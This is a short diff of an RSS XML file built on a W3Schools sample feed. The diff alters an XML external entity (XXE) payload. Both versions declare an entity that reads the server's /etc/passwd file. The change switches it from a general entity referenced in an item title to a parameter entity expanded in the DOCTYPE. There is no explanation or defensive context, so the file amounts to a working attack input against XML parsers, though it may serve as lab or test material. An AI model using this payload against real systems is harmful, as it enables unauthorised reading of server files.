@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE title [ <!ELEMENT title ANY >
-<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>
 <rss version="2.0">
 
 <channel>
@@ -8,7 +8,7 @@
   <link>https://www.w3schools.com</link>
   <description>Free web building tutorials</description>
   <item>
-    <title>&xxe;</title>
+    <title>%xxe;</title>
     <link>https://www.w3schools.com/xml/xml_rss.asp</link>
     <description>New RSS tutorial on W3Schools</description>
   </item>
